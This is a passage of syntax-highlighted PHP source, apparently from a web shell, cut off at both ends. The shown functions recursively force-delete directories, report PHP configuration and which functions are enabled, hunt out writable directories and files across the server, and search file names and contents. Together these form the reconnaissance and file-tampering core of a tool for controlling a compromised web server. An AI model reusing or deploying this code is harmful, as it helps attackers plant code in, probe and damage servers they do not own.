<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> (<span style="color: #4d4d4c; background-color: #ffffff;">is_file(</span>$<span style="color: #eab700;">deldir</span>.<span style="color: #3e999f;">'/'</span>.$<span style="color: #eab700;">file</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   @<span style="color: #4d4d4c; background-color: #ffffff;">chmod(</span>$<span style="color: #eab700;">deldir</span>.<span style="color: #3e999f;">'/'</span>.$<span style="color: #eab700;">file</span>,<span style="color: #4d4d4c; background-color: #ffffff;">0777</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   @<span style="color: #4d4d4c; background-color: #ffffff;">unlink(</span>$<span style="color: #eab700;">deldir</span>.<span style="color: #3e999f;">'/'</span>.$<span style="color: #eab700;">file</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   }<span style="color: #c82829; background-color: #d6d6d6;"> </span>
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">mydir</span>-&gt;<span style="color: #4d4d4c; background-color: #ffffff;">close</span>();<span style="color: #c82829; background-color: #d6d6d6;"> </span>
<span style="background-color: #d6d6d6;"> </span>   @<span style="color: #4d4d4c; background-color: #ffffff;">chmod(</span>$<span style="color: #eab700;">deldir</span>,<span style="color: #4d4d4c; background-color: #ffffff;">0777</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">return</span> @<span style="color: #4d4d4c; background-color: #ffffff;">rmdir(</span>$<span style="color: #eab700;">deldir</span>) ? <span style="color: #4d4d4c; background-color: #ffffff;">1</span> : <span style="color: #4d4d4c; background-color: #ffffff;">0</span>;
}

<span style="color: #8e908c; font-style: italic;">// </span><span style="color: #8e908c; font-style: italic;">&#34920;&#26684;&#34892;&#38388;&#30340;&#32972;&#26223;&#33394;&#26367;&#25442;</span>
<span style="color: #718c00;">function</span> <span style="color: #f5871f;">bg</span>() {
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">global</span> $<span style="color: #eab700;">bgc</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">return</span> ($<span style="color: #eab700;">bgc</span>++%<span style="color: #4d4d4c; background-color: #ffffff;">2</span>==<span style="color: #4d4d4c; background-color: #ffffff;">0</span>) ? <span style="color: #3e999f;">'alt1'</span> : <span style="color: #3e999f;">'alt2'</span>;
}

<span style="color: #8e908c; font-style: italic;">// </span><span style="color: #8e908c; font-style: italic;">&#33719;&#21462;&#24403;&#21069;&#30340;&#25991;&#20214;&#31995;&#32479;&#36335;&#24452;</span>
<span style="color: #718c00;">function</span> <span style="color: #f5871f;">getPath</span>($<span style="color: #eab700;">scriptpath</span>, $<span style="color: #eab700;">nowpath</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">nowpath</span> == <span style="color: #3e999f;">'.'</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">nowpath</span> = $<span style="color: #eab700;">scriptpath</span>;
<span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">nowpath</span> = <span style="color: #4d4d4c; background-color: #ffffff;">str_replace(</span><span style="color: #3e999f;">'\\'</span>, <span style="color: #3e999f;">'/'</span>, $<span style="color: #eab700;">nowpath</span>);
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">nowpath</span> = <span style="color: #4d4d4c; background-color: #ffffff;">str_replace(</span><span style="color: #3e999f;">'//'</span>, <span style="color: #3e999f;">'/'</span>, $<span style="color: #eab700;">nowpath</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> (<span style="color: #4d4d4c; background-color: #ffffff;">substr(</span>$<span style="color: #eab700;">nowpath</span>, -<span style="color: #4d4d4c; background-color: #ffffff;">1</span>) != <span style="color: #3e999f;">'/'</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">nowpath</span> = $<span style="color: #eab700;">nowpath</span>.<span style="color: #3e999f;">'/'</span>;
<span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">return</span> $<span style="color: #eab700;">nowpath</span>;
}

<span style="color: #8e908c; font-style: italic;">// </span><span style="color: #8e908c; font-style: italic;">&#33719;&#21462;&#24403;&#21069;&#30446;&#24405;&#30340;&#19978;&#32423;&#30446;&#24405;</span>
<span style="color: #718c00;">function</span> <span style="color: #f5871f;">getUpPath</span>($<span style="color: #eab700;">nowpath</span>) {
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">pathdb</span> = <span style="color: #4d4d4c; background-color: #ffffff;">explode(</span><span style="color: #3e999f;">'/'</span>, $<span style="color: #eab700;">nowpath</span>);
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">num</span> = <span style="color: #4d4d4c; background-color: #ffffff;">count(</span>$<span style="color: #eab700;">pathdb</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">num</span> &gt; <span style="color: #4d4d4c; background-color: #ffffff;">2</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">unset(</span>$<span style="color: #eab700;">pathdb</span>[$<span style="color: #eab700;">num</span>-<span style="color: #4d4d4c; background-color: #ffffff;">1</span>],$<span style="color: #eab700;">pathdb</span>[$<span style="color: #eab700;">num</span>-<span style="color: #4d4d4c; background-color: #ffffff;">2</span>]);
<span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">uppath</span> = <span style="color: #4d4d4c; background-color: #ffffff;">implode(</span><span style="color: #3e999f;">'/'</span>, $<span style="color: #eab700;">pathdb</span>).<span style="color: #3e999f;">'/'</span>;
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">uppath</span> = <span style="color: #4d4d4c; background-color: #ffffff;">str_replace(</span><span style="color: #3e999f;">'//'</span>, <span style="color: #3e999f;">'/'</span>, $<span style="color: #eab700;">uppath</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">return</span> $<span style="color: #eab700;">uppath</span>;
}

<span style="color: #8e908c; font-style: italic;">// </span><span style="color: #8e908c; font-style: italic;">&#26816;&#26597;PHP&#37197;&#32622;&#21442;&#25968;</span>
<span style="color: #718c00;">function</span> <span style="color: #f5871f;">getcfg</span>($<span style="color: #eab700;">varname</span>) {
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">result</span> = <span style="color: #4d4d4c; background-color: #ffffff;">get_cfg_var(</span>$<span style="color: #eab700;">varname</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">result</span> == <span style="color: #4d4d4c; background-color: #ffffff;">0</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">return</span> <span style="color: #3e999f;">'No'</span>;
<span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">elseif</span> ($<span style="color: #eab700;">result</span> == <span style="color: #4d4d4c; background-color: #ffffff;">1</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">return</span> <span style="color: #3e999f;">'Yes'</span>;
<span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">else</span> {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">return</span> $<span style="color: #eab700;">result</span>;
<span style="background-color: #d6d6d6;"> </span>   }
}

<span style="color: #8e908c; font-style: italic;">// </span><span style="color: #8e908c; font-style: italic;">&#26816;&#26597;&#20989;&#25968;&#24773;&#20917;</span>
<span style="color: #718c00;">function</span> <span style="color: #f5871f;">getfun</span>($<span style="color: #eab700;">funName</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">return</span> (<span style="color: #4271ae;">false</span> !== <span style="color: #4d4d4c; background-color: #ffffff;">function_exists(</span>$<span style="color: #eab700;">funName</span>)) ? <span style="color: #3e999f;">'Yes'</span> : <span style="color: #3e999f;">'No'</span>;
}

<span style="color: #8e908c; font-style: italic;">// </span><span style="color: #8e908c; font-style: italic;">&#33719;&#24471;&#25991;&#20214;&#25193;&#23637;&#21517;</span>
<span style="color: #718c00;">function</span> <span style="color: #f5871f;">getext</span>($<span style="color: #eab700;">file</span>) {
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">info</span> = <span style="color: #4d4d4c; background-color: #ffffff;">pathinfo(</span>$<span style="color: #eab700;">file</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">return</span> $<span style="color: #eab700;">info</span>[<span style="color: #3e999f;">'extension'</span>];
}

<span style="color: #718c00;">function</span> <span style="color: #f5871f;">GetWDirList</span>($<span style="color: #eab700;">dir</span>){
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">global</span> $<span style="color: #eab700;">dirdata</span>,$<span style="color: #eab700;">j</span>,$<span style="color: #eab700;">nowpath</span>;
<span style="background-color: #d6d6d6;"> </span>   !$<span style="color: #eab700;">j</span> &amp;&amp; $<span style="color: #eab700;">j</span>=<span style="color: #4d4d4c; background-color: #ffffff;">1</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">dh</span> = <span style="color: #4d4d4c; background-color: #ffffff;">opendir(</span>$<span style="color: #eab700;">dir</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">while</span> ($<span style="color: #eab700;">file</span> = <span style="color: #4d4d4c; background-color: #ffffff;">readdir(</span>$<span style="color: #eab700;">dh</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">f</span>=<span style="color: #4d4d4c; background-color: #ffffff;">str_replace(</span><span style="color: #3e999f;">'//'</span>,<span style="color: #3e999f;">'/'</span>,$<span style="color: #eab700;">dir</span>.<span style="color: #3e999f;">'/'</span>.$<span style="color: #eab700;">file</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>($<span style="color: #eab700;">file</span>!=<span style="color: #3e999f;">'.'</span> &amp;&amp; $<span style="color: #eab700;">file</span>!=<span style="color: #3e999f;">'..'</span> &amp;&amp; <span style="color: #4d4d4c; background-color: #ffffff;">is_dir(</span>$<span style="color: #eab700;">f</span>)){
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> (<span style="color: #4d4d4c; background-color: #ffffff;">is_writable(</span>$<span style="color: #eab700;">f</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">dirdata</span>[$<span style="color: #eab700;">j</span>][<span style="color: #3e999f;">'filename'</span>]=<span style="color: #4d4d4c; background-color: #ffffff;">str_replace(</span>$<span style="color: #eab700;">nowpath</span>,<span style="color: #3e999f;">''</span>,$<span style="color: #eab700;">f</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">dirdata</span>[$<span style="color: #eab700;">j</span>][<span style="color: #3e999f;">'mtime'</span>]=<span style="color: #718c00;">@date</span>(<span style="color: #3e999f;">'Y-m-d H:i:s'</span>,<span style="color: #4d4d4c; background-color: #ffffff;">filemtime(</span>$<span style="color: #eab700;">f</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">dirdata</span>[$<span style="color: #eab700;">j</span>][<span style="color: #3e999f;">'dirchmod'</span>]=<span style="color: #4d4d4c; background-color: #ffffff;">getChmod(</span>$<span style="color: #eab700;">f</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">dirdata</span>[$<span style="color: #eab700;">j</span>][<span style="color: #3e999f;">'dirperm'</span>]=<span style="color: #4d4d4c; background-color: #ffffff;">getPerms(</span>$<span style="color: #eab700;">f</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">dirdata</span>[$<span style="color: #eab700;">j</span>][<span style="color: #3e999f;">'dirlink'</span>]=$<span style="color: #eab700;">dir</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">dirdata</span>[$<span style="color: #eab700;">j</span>][<span style="color: #3e999f;">'server_link'</span>]=$<span style="color: #eab700;">f</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">j</span>++;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">GetWDirList(</span>$<span style="color: #eab700;">f</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">closedir(</span>$<span style="color: #eab700;">dh</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">clearstatcache(</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">return</span> $<span style="color: #eab700;">dirdata</span>;
<span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">else</span> {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">return</span> <span style="color: #4d4d4c; background-color: #ffffff;">array(</span>);
<span style="background-color: #d6d6d6;"> </span>   }
}

<span style="color: #718c00;">function</span> <span style="color: #f5871f;">GetWFileList</span>($<span style="color: #eab700;">dir</span>){
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">global</span> $<span style="color: #eab700;">filedata</span>,$<span style="color: #eab700;">j</span>,$<span style="color: #eab700;">nowpath</span>, $<span style="color: #eab700;">writabledb</span>;
<span style="background-color: #d6d6d6;"> </span>   !$<span style="color: #eab700;">j</span> &amp;&amp; $<span style="color: #eab700;">j</span>=<span style="color: #4d4d4c; background-color: #ffffff;">1</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">dh</span> = <span style="color: #4d4d4c; background-color: #ffffff;">opendir(</span>$<span style="color: #eab700;">dir</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">while</span> ($<span style="color: #eab700;">file</span> = <span style="color: #4d4d4c; background-color: #ffffff;">readdir(</span>$<span style="color: #eab700;">dh</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">ext</span> = <span style="color: #4d4d4c; background-color: #ffffff;">getext(</span>$<span style="color: #eab700;">file</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">f</span>=<span style="color: #4d4d4c; background-color: #ffffff;">str_replace(</span><span style="color: #3e999f;">'//'</span>,<span style="color: #3e999f;">'/'</span>,$<span style="color: #eab700;">dir</span>.<span style="color: #3e999f;">'/'</span>.$<span style="color: #eab700;">file</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>($<span style="color: #eab700;">file</span>!=<span style="color: #3e999f;">'.'</span> &amp;&amp; $<span style="color: #eab700;">file</span>!=<span style="color: #3e999f;">'..'</span> &amp;&amp; <span style="color: #4d4d4c; background-color: #ffffff;">is_dir(</span>$<span style="color: #eab700;">f</span>)){
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">GetWFileList(</span>$<span style="color: #eab700;">f</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">elseif</span>($<span style="color: #eab700;">file</span>!=<span style="color: #3e999f;">'.'</span> &amp;&amp; $<span style="color: #eab700;">file</span>!=<span style="color: #3e999f;">'..'</span> &amp;&amp; <span style="color: #4d4d4c; background-color: #ffffff;">is_file(</span>$<span style="color: #eab700;">f</span>) &amp;&amp; <span style="color: #4d4d4c; background-color: #ffffff;">in_array(</span>$<span style="color: #eab700;">ext</span>, <span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">explode(</span><span style="color: #3e999f; text-decoration: underline;">','</span><span style="text-decoration: underline;">, $</span><span style="color: #eab700; text-decoration: underline;">writabledb</span><span style="text-decoration: underline;">))){</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> (<span style="color: #4d4d4c; background-color: #ffffff;">is_writable(</span>$<span style="color: #eab700;">f</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">filedata</span>[$<span style="color: #eab700;">j</span>][<span style="color: #3e999f;">'filename'</span>]=<span style="color: #4d4d4c; background-color: #ffffff;">str_replace(</span>$<span style="color: #eab700;">nowpath</span>,<span style="color: #3e999f;">''</span>,$<span style="color: #eab700;">f</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">filedata</span>[$<span style="color: #eab700;">j</span>][<span style="color: #3e999f;">'size'</span>]=<span style="color: #4d4d4c; background-color: #ffffff;">sizecount(</span>@<span style="color: #4d4d4c; background-color: #ffffff;">filesize(</span>$<span style="color: #eab700;">f</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">filedata</span>[$<span style="color: #eab700;">j</span>][<span style="color: #3e999f;">'mtime'</span>]=<span style="color: #718c00;">@date</span>(<span style="color: #3e999f;">'Y-m-d H:i:s'</span>,<span style="color: #4d4d4c; background-color: #ffffff;">filemtime(</span>$<span style="color: #eab700;">f</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">filedata</span>[$<span style="color: #eab700;">j</span>][<span style="color: #3e999f;">'filechmod'</span>]=<span style="color: #4d4d4c; background-color: #ffffff;">getChmod(</span>$<span style="color: #eab700;">f</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">filedata</span>[$<span style="color: #eab700;">j</span>][<span style="color: #3e999f;">'fileperm'</span>]=<span style="color: #4d4d4c; background-color: #ffffff;">getPerms(</span>$<span style="color: #eab700;">f</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">filedata</span>[$<span style="color: #eab700;">j</span>][<span style="color: #3e999f;">'fileowner'</span>]=<span style="color: #4d4d4c; background-color: #ffffff;">getUser(</span>$<span style="color: #eab700;">f</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">filedata</span>[$<span style="color: #eab700;">j</span>][<span style="color: #3e999f;">'dirlink'</span>]=$<span style="color: #eab700;">dir</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">filedata</span>[$<span style="color: #eab700;">j</span>][<span style="color: #3e999f;">'server_link'</span>]=$<span style="color: #eab700;">f</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">j</span>++;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">closedir(</span>$<span style="color: #eab700;">dh</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">clearstatcache(</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">return</span> $<span style="color: #eab700;">filedata</span>;
<span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">else</span> {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">return</span> <span style="color: #4d4d4c; background-color: #ffffff;">array(</span>);
<span style="background-color: #d6d6d6;"> </span>   }
}

<span style="color: #718c00;">function</span> <span style="color: #f5871f;">GetSFileList</span>($<span style="color: #eab700;">dir</span>, $<span style="color: #eab700;">content</span>, $<span style="color: #eab700;">re</span> = <span style="color: #4d4d4c; background-color: #ffffff;">0</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">global</span> $<span style="color: #eab700;">filedata</span>,$<span style="color: #eab700;">j</span>,$<span style="color: #eab700;">nowpath</span>, $<span style="color: #eab700;">writabledb</span>;
<span style="background-color: #d6d6d6;"> </span>   !$<span style="color: #eab700;">j</span> &amp;&amp; $<span style="color: #eab700;">j</span>=<span style="color: #4d4d4c; background-color: #ffffff;">1</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">dh</span> = <span style="color: #4d4d4c; background-color: #ffffff;">opendir(</span>$<span style="color: #eab700;">dir</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">while</span> ($<span style="color: #eab700;">file</span> = <span style="color: #4d4d4c; background-color: #ffffff;">readdir(</span>$<span style="color: #eab700;">dh</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">ext</span> = <span style="color: #4d4d4c; background-color: #ffffff;">getext(</span>$<span style="color: #eab700;">file</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">f</span>=<span style="color: #4d4d4c; background-color: #ffffff;">str_replace(</span><span style="color: #3e999f;">'//'</span>,<span style="color: #3e999f;">'/'</span>,$<span style="color: #eab700;">dir</span>.<span style="color: #3e999f;">'/'</span>.$<span style="color: #eab700;">file</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>($<span style="color: #eab700;">file</span>!=<span style="color: #3e999f;">'.'</span> &amp;&amp; $<span style="color: #eab700;">file</span>!=<span style="color: #3e999f;">'..'</span> &amp;&amp; <span style="color: #4d4d4c; background-color: #ffffff;">is_dir(</span>$<span style="color: #eab700;">f</span>)){
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">GetSFileList(</span>$<span style="color: #eab700;">f</span>, $<span style="color: #eab700;">content</span>, $<span style="color: #eab700;">re</span> = <span style="color: #4d4d4c; background-color: #ffffff;">0</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">elseif</span>($<span style="color: #eab700;">file</span>!=<span style="color: #3e999f;">'.'</span> &amp;&amp; $<span style="color: #eab700;">file</span>!=<span style="color: #3e999f;">'..'</span> &amp;&amp; <span style="color: #4d4d4c; background-color: #ffffff;">is_file(</span>$<span style="color: #eab700;">f</span>) &amp;&amp; <span style="color: #4d4d4c; background-color: #ffffff;">in_array(</span>$<span style="color: #eab700;">ext</span>, <span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">explode(</span><span style="color: #3e999f; text-decoration: underline;">','</span><span style="text-decoration: underline;">, $</span><span style="color: #eab700; text-decoration: underline;">writabledb</span><span style="text-decoration: underline;">))){</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">find</span> = <span style="color: #4d4d4c; background-color: #ffffff;">0</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">re</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ( <span style="color: #4d4d4c; background-color: #ffffff;">preg_match(</span><span style="color: #3e999f;">'@'</span>.$<span style="color: #eab700;">content</span>.<span style="color: #3e999f;">'@'</span>,$<span style="color: #eab700;">file</span>) || <span style="color: #4d4d4c; background-color: #ffffff;">preg_match(</span><span style="color: #3e999f;">'@'</span>.$<span style="color: #eab700;">c</span><span style="color: #eab700; text-decoration: underline;">ontent</span><span style="text-decoration: underline;">.</span><span style="color: #3e999f; text-decoration: underline;">'@'</span><span style="text-decoration: underline;">, @</span><span style="color: #4d4d4c; background-color: #ffffff; text-decoration: underline;">file_get_contents(</span><span style="text-decoration: underline;">$</span><span style="color: #eab700; text-decoration: underline;">f</span><span style="text-decoration: underline;">)) ){</span>
